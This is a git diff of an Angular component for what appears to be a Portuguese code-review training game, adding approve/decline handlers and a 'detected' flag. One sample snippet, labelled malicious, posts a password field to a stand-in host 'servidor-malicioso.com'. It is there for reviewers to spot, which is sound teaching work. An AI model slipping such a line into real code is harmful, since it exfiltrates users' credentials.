@@ -28,7 +28,8 @@ export class AppComponent {
           'senha': '123456'
       }
       response = requests.post('http://www.servidor-malicioso.com', data=dados)`,
-      error : this.erro.codigoMalicioso
+      error : this.erro.codigoMalicioso,
+      detected : false
     },
     {
       function : `def calcular_soma(lista):
@@ -36,15 +37,41 @@ export class AppComponent {
       for elemento in lista:
           soma += elemento
       return soma`,
-      error : this.erro.none
-    }
+      error : this.erro.none,
+      detected : false
+    },
+    
   ]
 
   codigoSelecionado : any
+  index : any
   regraSelecionada : any
 
-  codigoSelected(code: any) {
+  erroDetectado: any
+
+  approved() {
+    var errorDetected = false
+    this.codigo.forEach((e) => {
+      if(e.error != this.erro.none) errorDetected = true
+    })
+
+    if(errorDetected) console.log("Você aprovou um codigo com falhas, se sinta envergonhado!!!")
+    else console.log("tudo de acordo, parabens!")
+  }
+
+  declined() {
+    var errorDetected = false
+    this.codigo.forEach((e) => {
+      if(e.error != this.erro.none && !e.detected) errorDetected = true
+    })
+
+    if(errorDetected) console.log("Um codigo rejeitado deve haver justificativas")
+    else console.log("Você recusou um codigo com problemas, muito bem!")
+  }
+
+  codigoSelected(code: any, i : number) {
     this.codigoSelecionado = code
+    this.index = i
     this.compare()
   }
   
@@ -57,6 +84,7 @@ export class AppComponent {
     if(this.codigoSelecionado == null || this.regraSelecionada == null) return
     if(this.codigoSelecionado.error == this.regraSelecionada.error) {
       console.log("achou um erro")
+      this.codigo[this.index].detected = true
     }else {
       console.log("Tudo certo por aqui!")
     }
